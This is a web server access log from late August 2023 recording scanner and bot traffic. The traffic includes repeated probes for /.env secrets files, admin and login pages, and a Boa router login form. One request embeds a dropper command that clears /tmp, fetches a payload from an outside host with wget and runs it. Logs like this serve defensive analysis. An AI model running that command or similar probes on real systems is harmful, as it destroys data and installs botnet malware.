172.104.11.51 - - [27/Aug/2023:23:50:25 +0000] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03\xC8\xE2\xE4\xB4c+@\xCD\x9Ch\x95\x97\xDDN\xC1\x18\xF1\xD0\xFE(\xB9B\x8E\xED\x8A\xDE\xEA\xABm\x8A\xE9\x04\x00\x00 \xC0/\xC00\xC0+\xC0,\xCC\xA8\xCC\xA9\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-" "-"
20.229.51.198 - - [27/Aug/2023:23:52:48 +0000] "GET /index.php HTTP/1.1" 200 95845 "-" "Go-http-client/1.1" "-"
109.237.96.251 - - [28/Aug/2023:00:06:07 +0000] "GET /users/sign_in HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
109.237.96.251 - - [28/Aug/2023:00:06:07 +0000] "GET /users/sign_in HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
109.237.96.251 - - [28/Aug/2023:00:06:08 +0000] "GET /users/sign_in HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
109.237.96.251 - - [28/Aug/2023:00:06:09 +0000] "GET /users/sign_in HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
40.113.118.83 - - [28/Aug/2023:00:07:52 +0000] "GET /index.php HTTP/1.1" 200 95845 "-" "Go-http-client/1.1" "-"
167.172.52.0 - - [28/Aug/2023:00:16:59 +0000] "HEAD /panel/admin.php HTTP/1.1" 404 0 "-" "python-requests/2.18.4" "-"
13.95.133.245 - - [28/Aug/2023:00:24:09 +0000] "GET /index.php HTTP/1.1" 200 95844 "-" "Go-http-client/1.1" "-"
186.209.29.114 - - [28/Aug/2023:00:34:22 +0000] "GET / HTTP/1.1" 200 95826 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36" "-"
1.14.7.100 - - [28/Aug/2023:00:39:03 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
139.162.84.205 - - [28/Aug/2023:00:42:59 +0000] "GET / HTTP/1.0" 200 28038 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36" "-"
135.125.246.110 - - [28/Aug/2023:01:01:16 +0000] "POST / HTTP/1.1" 200 96783 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
135.125.246.110 - - [28/Aug/2023:01:01:17 +0000] "GET /.env HTTP/1.1" 404 555 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
20.229.51.198 - - [28/Aug/2023:01:10:15 +0000] "GET /index.php HTTP/1.1" 200 95845 "-" "Go-http-client/1.1" "-"
135.125.246.110 - - [28/Aug/2023:01:18:37 +0000] "POST / HTTP/1.1" 200 96783 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
135.125.246.110 - - [28/Aug/2023:01:18:38 +0000] "GET /.env HTTP/1.1" 404 555 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
185.254.196.173 - - [28/Aug/2023:01:35:50 +0000] "GET /.env HTTP/1.1" 404 555 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
13.95.133.245 - - [28/Aug/2023:02:02:41 +0000] "GET /index.php HTTP/1.1" 200 95845 "-" "Go-http-client/1.1" "-"
40.113.118.83 - - [28/Aug/2023:02:31:05 +0000] "GET /index.php HTTP/1.1" 200 95845 "-" "Go-http-client/1.1" "-"
51.132.236.67 - - [28/Aug/2023:02:39:06 +0000] "GET /.env HTTP/1.1" 404 555 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
51.132.236.67 - - [28/Aug/2023:02:39:06 +0000] "POST /.env HTTP/1.1" 404 555 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
1.14.7.100 - - [28/Aug/2023:02:39:36 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
198.235.24.93 - - [28/Aug/2023:02:41:08 +0000] "\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03]:e\x8E\x07a\xB9\xB4P\xF4\xAC@\xFD\xEF{>{`\x91\x8D4\x89\xFB" 400 157 "-" "-" "-"
40.113.118.83 - - [28/Aug/2023:02:46:12 +0000] "GET /index.php HTTP/1.1" 200 95868 "-" "Go-http-client/1.1" "-"
198.235.24.170 - - [28/Aug/2023:03:14:40 +0000] "GET / HTTP/1.0" 200 95906 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com" "-"
40.113.118.83 - - [28/Aug/2023:03:16:33 +0000] "GET /index.php HTTP/1.1" 200 95845 "-" "Go-http-client/1.1" "-"
71.6.232.28 - - [28/Aug/2023:03:18:42 +0000] "GET / HTTP/1.1" 200 96005 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36" "-"
120.75.94.198 - - [28/Aug/2023:03:32:49 +0000] "POST /index.php HTTP/1.1" 200 96426 "-" "Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.1)" "-"
120.75.94.198 - - [28/Aug/2023:03:32:50 +0000] "POST /index.php HTTP/1.1" 200 96449 "-" "Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.1)" "-"
20.229.51.198 - - [28/Aug/2023:03:47:10 +0000] "GET /index.php HTTP/1.1" 200 95845 "-" "Go-http-client/1.1" "-"
192.155.90.118 - - [28/Aug/2023:03:53:52 +0000] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03\xE4\xDCS\xA5fp\xE4\x90" 400 157 "-" "-" "-"
40.113.118.83 - - [28/Aug/2023:04:02:44 +0000] "GET /index.php HTTP/1.1" 200 95845 "-" "Go-http-client/1.1" "-"
205.210.31.31 - - [28/Aug/2023:04:33:29 +0000] "GET / HTTP/1.1" 200 96021 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com" "-"
135.125.244.48 - - [28/Aug/2023:04:33:33 +0000] "GET /.env HTTP/1.1" 404 555 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
135.125.244.48 - - [28/Aug/2023:04:33:34 +0000] "POST / HTTP/1.1" 200 96781 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
20.229.51.198 - - [28/Aug/2023:04:35:05 +0000] "GET /index.php HTTP/1.1" 200 95845 "-" "Go-http-client/1.1" "-"
139.162.84.205 - - [28/Aug/2023:04:38:25 +0000] "GET / HTTP/1.0" 200 28038 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36" "-"
1.14.7.100 - - [28/Aug/2023:04:42:17 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
40.113.118.83 - - [28/Aug/2023:04:50:58 +0000] "GET /index.php HTTP/1.1" 200 95843 "-" "Go-http-client/1.1" "-"
20.229.51.198 - - [28/Aug/2023:05:07:56 +0000] "GET /index.php HTTP/1.1" 200 95845 "-" "Go-http-client/1.1" "-"
162.216.150.162 - - [28/Aug/2023:05:21:02 +0000] "GET / HTTP/1.1" 200 96025 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com" "-"
51.132.236.67 - - [28/Aug/2023:05:36:06 +0000] "GET /.env HTTP/1.1" 404 555 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
51.132.236.67 - - [28/Aug/2023:05:36:07 +0000] "POST /.env HTTP/1.1" 404 555 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
185.254.196.186 - - [28/Aug/2023:05:41:57 +0000] "GET /.env HTTP/1.1" 404 555 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
185.254.196.186 - - [28/Aug/2023:05:41:58 +0000] "POST / HTTP/1.1" 200 96773 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
40.113.118.83 - - [28/Aug/2023:05:44:35 +0000] "GET /index.php HTTP/1.1" 200 95843 "-" "Go-http-client/1.1" "-"
20.229.51.198 - - [28/Aug/2023:05:59:52 +0000] "GET /index.php HTTP/1.1" 200 95845 "-" "Go-http-client/1.1" "-"
109.237.96.251 - - [28/Aug/2023:06:11:28 +0000] "GET /users/sign_in HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
109.237.96.251 - - [28/Aug/2023:06:11:28 +0000] "GET /users/sign_in HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
109.237.96.251 - - [28/Aug/2023:06:11:29 +0000] "GET /users/sign_in HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
109.237.96.251 - - [28/Aug/2023:06:11:30 +0000] "GET /users/sign_in HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
40.113.118.83 - - [28/Aug/2023:06:15:11 +0000] "GET /index.php HTTP/1.1" 200 95845 "-" "Go-http-client/1.1" "-"
157.119.223.246 - - [28/Aug/2023:06:18:41 +0000] "GET / HTTP/1.0" 200 13150 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)" "-"
162.243.135.43 - - [28/Aug/2023:06:23:27 +0000] "MGLNDD_13.127.215.254_80" 400 157 "-" "-" "-"
167.172.52.0 - - [28/Aug/2023:06:25:20 +0000] "HEAD /panel/admin.php HTTP/1.1" 404 0 "-" "python-requests/2.18.4" "-"
40.113.118.83 - - [28/Aug/2023:06:30:15 +0000] "GET /index.php HTTP/1.1" 200 95845 "-" "Go-http-client/1.1" "-"
1.14.7.100 - - [28/Aug/2023:06:56:42 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
20.229.51.198 - - [28/Aug/2023:07:16:29 +0000] "GET /index.php HTTP/1.1" 200 95845 "-" "Go-http-client/1.1" "-"
74.82.47.4 - - [28/Aug/2023:07:20:32 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03Z~\xBD\x1Bh\xC6t+\xBE\xC6\x95m\x13\xE2\xA4,\xF4\xF5\xE2\xF4\xA7\xC5\xA1T\x97\x81\xCE\x9FdF\x0E(\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-" "-"
205.210.31.2 - - [28/Aug/2023:07:52:52 +0000] "GET / HTTP/1.0" 200 95902 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com" "-"
20.229.51.198 - - [28/Aug/2023:08:02:37 +0000] "GET /index.php HTTP/1.1" 200 95845 "-" "Go-http-client/1.1" "-"
223.68.160.146 - - [28/Aug/2023:08:10:50 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+ testbots.maizhangyu.top/jaws;sh+/tmp/jaws HTTP/1.1" 400 157 "-" "-" "-"
13.95.133.245 - - [28/Aug/2023:08:17:42 +0000] "GET /index.php HTTP/1.1" 200 95845 "-" "Go-http-client/1.1" "-"
135.125.244.48 - - [28/Aug/2023:08:18:49 +0000] "GET /.env HTTP/1.1" 404 555 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
135.125.244.48 - - [28/Aug/2023:08:18:50 +0000] "POST / HTTP/1.1" 200 96780 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
80.76.51.50 - - [28/Aug/2023:08:27:57 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 153 "http://13.127.215.254:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0" "-"
80.76.51.50 - - [28/Aug/2023:08:27:57 +0000] "" 400 0 "-" "-" "-"
20.229.51.198 - - [28/Aug/2023:08:32:46 +0000] "GET /index.php HTTP/1.1" 200 95845 "-" "Go-http-client/1.1" "-"
139.162.84.205 - - [28/Aug/2023:08:38:55 +0000] "GET / HTTP/1.0" 200 28038 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36" "-"
3.10.198.239 - - [28/Aug/2023:08:43:45 +0000] "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" 400 157 "-" "-" "-"
13.95.133.245 - - [28/Aug/2023:08:47:49 +0000] "GET /index.php HTTP/1.1" 200 95845 "-" "Go-http-client/1.1" "-"
20.229.51.198 - - [28/Aug/2023:09:02:59 +0000] "GET /index.php HTTP/1.1" 200 95845 "-" "Go-http-client/1.1" "-"
1.14.7.100 - - [28/Aug/2023:09:06:07 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
201.220.148.207 - - [28/Aug/2023:09:07:11 +0000] "GET / HTTP/1.1" 200 95826 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36" "-"
40.113.118.83 - - [28/Aug/2023:09:18:08 +0000] "GET /index.php HTTP/1.1" 200 95845 "-" "Go-http-client/1.1" "-"
135.125.244.48 - - [28/Aug/2023:09:26:12 +0000] "GET /.env HTTP/1.1" 404 555 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
135.125.244.48 - - [28/Aug/2023:09:26:13 +0000] "POST / HTTP/1.1" 200 96781 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
20.229.51.198 - - [28/Aug/2023:09:33:21 +0000] "GET /index.php HTTP/1.1" 200 95845 "-" "Go-http-client/1.1" "-"
13.95.133.245 - - [28/Aug/2023:10:03:24 +0000] "GET /index.php HTTP/1.1" 200 95845 "-" "Go-http-client/1.1" "-"
185.254.196.173 - - [28/Aug/2023:10:09:11 +0000] "GET /.env HTTP/1.1" 404 555 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
185.254.196.173 - - [28/Aug/2023:10:09:15 +0000] "POST / HTTP/1.1" 200 96773 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
40.113.118.83 - - [28/Aug/2023:10:18:24 +0000] "GET /index.php HTTP/1.1" 200 95845 "-" "Go-http-client/1.1" "-"
87.185.16.191 - - [28/Aug/2023:10:24:11 +0000] "GET / HTTP/1.0" 200 29738 "-" "-" "-"
104.152.52.58 - - [28/Aug/2023:10:33:29 +0000] "GET / HTTP/1.0" 200 95066 "-" "-" "-"
78.187.199.137 - - [28/Aug/2023:10:35:52 +0000] "GET / HTTP/1.0" 200 29738 "-" "-" "-"
20.229.51.198 - - [28/Aug/2023:10:48:32 +0000] "GET /index.php HTTP/1.1" 200 95845 "-" "Go-http-client/1.1" "-"
59.24.186.249 - - [28/Aug/2023:10:57:27 +0000] "GET /manager/html HTTP/1.1" 404 153 "-" "python-requests/2.27.1" "-"
40.113.118.83 - - [28/Aug/2023:11:03:35 +0000] "GET /index.php HTTP/1.1" 200 95868 "-" "Go-http-client/1.1" "-"
107.170.243.44 - - [28/Aug/2023:11:05:39 +0000] "GET /druid/index.html HTTP/1.1" 404 153 "-" "Mozilla/5.0 zgrab/0.x" "-"
94.69.86.91 - - [28/Aug/2023:11:07:42 +0000] "GET / HTTP/1.0" 200 13774 "-" "-" "-"
1.14.7.100 - - [28/Aug/2023:11:10:38 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
40.113.118.83 - - [28/Aug/2023:11:18:39 +0000] "GET /index.php HTTP/1.1" 200 95845 "-" "Go-http-client/1.1" "-"
47.88.86.63 - - [28/Aug/2023:11:24:49 +0000] "GET / HTTP/1.1" 200 96419 "-" "Mozilla/5.0 (Linux; Android 10; LIO-AN00 Build/HUAWEILIO-AN00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Mobile Safari/537.36" "-"
47.88.86.63 - - [28/Aug/2023:11:24:50 +0000] "GET /Public/home/js/check.js HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Linux; Android 10; LIO-AN00 Build/HUAWEILIO-AN00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Mobile Safari/537.36" "-"
47.89.193.162 - - [28/Aug/2023:11:24:51 +0000] "GET /static/admin/javascript/hetong.js HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Linux; Android 10; LIO-AN00 Build/HUAWEILIO-AN00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Mobile Safari/537.36" "-"
135.125.244.48 - - [28/Aug/2023:11:29:04 +0000] "GET /.env HTTP/1.1" 404 555 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
135.125.244.48 - - [28/Aug/2023:11:29:04 +0000] "POST / HTTP/1.1" 200 96781 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
40.113.118.83 - - [28/Aug/2023:11:48:44 +0000] "GET /index.php HTTP/1.1" 200 95845 "-" "Go-http-client/1.1" "-"
20.229.51.198 - - [28/Aug/2023:12:03:45 +0000] "GET /index.php HTTP/1.1" 200 95842 "-" "Go-http-client/1.1" "-"
167.172.52.0 - - [28/Aug/2023:12:25:21 +0000] "HEAD /panel/admin.php HTTP/1.1" 404 0 "-" "python-requests/2.18.4" "-"
109.237.96.124 - - [28/Aug/2023:12:32:17 +0000] "GET /users/sign_in HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
109.237.96.124 - - [28/Aug/2023:12:32:17 +0000] "GET /users/sign_in HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
109.237.96.124 - - [28/Aug/2023:12:32:18 +0000] "GET /users/sign_in HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
109.237.96.124 - - [28/Aug/2023:12:32:19 +0000] "GET /users/sign_in HTTP/1.1" 404 555 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
43.129.39.176 - - [28/Aug/2023:12:39:27 +0000] "GET / HTTP/1.1" 200 95642 "-" "curl/7.64.1" "-"
139.162.84.205 - - [28/Aug/2023:12:43:51 +0000] "GET / HTTP/1.0" 200 28038 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36" "-"
40.113.118.83 - - [28/Aug/2023:12:50:12 +0000] "GET /index.php HTTP/1.1" 200 95845 "-" "Go-http-client/1.1" "-"
128.1.248.42 - - [28/Aug/2023:12:55:02 +0000] "GET / HTTP/1.1" 200 96007 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36" "-"
20.229.51.198 - - [28/Aug/2023:13:05:17 +0000] "GET /index.php HTTP/1.1" 200 95845 "-" "Go-http-client/1.1" "-"
66.240.236.116 - - [28/Aug/2023:13:09:57 +0000] "GET / HTTP/1.1" 200 95823 "-" "Mozilla/5.0 zgrab/0.x" "-"
51.132.236.67 - - [28/Aug/2023:13:18:32 +0000] "GET /.env HTTP/1.1" 404 555 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
51.132.236.67 - - [28/Aug/2023:13:18:33 +0000] "POST /.env HTTP/1.1" 404 555 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
185.254.196.173 - - [28/Aug/2023:13:18:41 +0000] "GET /.env HTTP/1.1" 404 555 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
185.254.196.173 - - [28/Aug/2023:13:18:42 +0000] "POST / HTTP/1.1" 200 96773 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
20.229.51.198 - - [28/Aug/2023:13:20:18 +0000] "GET /index.php HTTP/1.1" 200 95845 "-" "Go-http-client/1.1" "-"
1.14.7.100 - - [28/Aug/2023:13:28:06 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
13.95.133.245 - - [28/Aug/2023:13:35:23 +0000] "GET /index.php HTTP/1.1" 200 95845 "-" "Go-http-client/1.1" "-"
117.212.7.251 - - [28/Aug/2023:13:46:41 +0000] "GET / HTTP/1.1" 200 95822 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" "-"
13.95.133.245 - - [28/Aug/2023:14:05:26 +0000] "GET /index.php HTTP/1.1" 200 95845 "-" "Go-http-client/1.1" "-"
185.94.193.244 - - [28/Aug/2023:14:05:43 +0000] "GET /.env HTTP/1.1" 404 153 "-" "python-requests/2.31.0" "-"
34.102.105.172 - - [28/Aug/2023:14:15:22 +0000] "\x16\x03\x01\x00M\x01\x00\x00I\x03\x03{\xC0\xD5&\x80u\xB2W\xD8i\x84}\x81 \x9E*\xB5e9\xCD^k\xBB2\x08\xF2\xD6\xED\xE6\xE4\xE4\x19 \xEE\xBFu" 400 157 "-" "-" "-"
34.102.105.172 - - [28/Aug/2023:14:15:24 +0000] "OPTIONS / HTTP/1.0" 405 157 "-" "-" "-"
135.125.244.48 - - [28/Aug/2023:14:35:31 +0000] "GET /.env HTTP/1.1" 404 555 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
135.125.244.48 - - [28/Aug/2023:14:35:31 +0000] "POST / HTTP/1.1" 200 96781 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
40.113.118.83 - - [28/Aug/2023:15:08:49 +0000] "GET /index.php HTTP/1.1" 200 95845 "-" "Go-http-client/1.1" "-"
34.78.6.216 - - [28/Aug/2023:15:38:26 +0000] "GET / HTTP/1.1" 200 96593 "-" "python-requests/2.31.0" "-"
1.14.7.100 - - [28/Aug/2023:15:45:03 +0000] "HEAD /Core/Skin/Login.aspx HTTP/1.1" 404 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36" "-"
20.229.51.198 - - [28/Aug/2023:15:55:13 +0000] "GET /index.php HTTP/1.1" 200 95845 "-" "Go-http-client/1.1" "-"
162.243.143.49 - - [28/Aug/2023:16:02:41 +0000] "GET /druid/index.html HTTP/1.1" 404 153 "-" "Mozilla/5.0 zgrab/0.x" "-"
135.125.246.110 - - [28/Aug/2023:16:09:05 +0000] "POST / HTTP/1.1" 200 96791 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
135.125.246.110 - - [28/Aug/2023:16:09:05 +0000] "GET /.env HTTP/1.1" 404 555 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
162.216.149.232 - - [28/Aug/2023:16:13:07 +0000] "GET / HTTP/1.1" 200 96025 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com" "-"
185.254.196.186 - - [28/Aug/2023:16:13:12 +0000] "GET /.env HTTP/1.1" 404 555 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
185.254.196.186 - - [28/Aug/2023:16:13:12 +0000] "POST / HTTP/1.1" 200 96773 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" "-"
172.105.120.11 - - [28/Aug/2023:16:21:49 +0000] "GET / HTTP/1.1" 200 86304 "-" "Linux Gnu (cow)" "-"
167.94.146.57 - - [28/Aug/2023:16:22:08 +0000] "GET / HTTP/1.1" 200 94992 "-" "-" "-"
167.94.146.57 - - [28/Aug/2023:16:22:08 +0000] "GET / HTTP/1.1" 200 95942 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)" "-"
167.94.146.57 - - [28/Aug/2023:16:22:09 +0000] "PRI * HTTP/2.0" 400 157 "-" "-" "-"
167.94.146.57 - - [28/Aug/2023:16:22:09 +0000] "GET /favicon.ico HTTP/1.1" 404 153 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)" "-"
13.95.133.245 - - [28/Aug/2023:16:25:20 +0000] "GET /index.php HTTP/1.1" 200 95845 "-" "Go-http-client/1.1" "-"
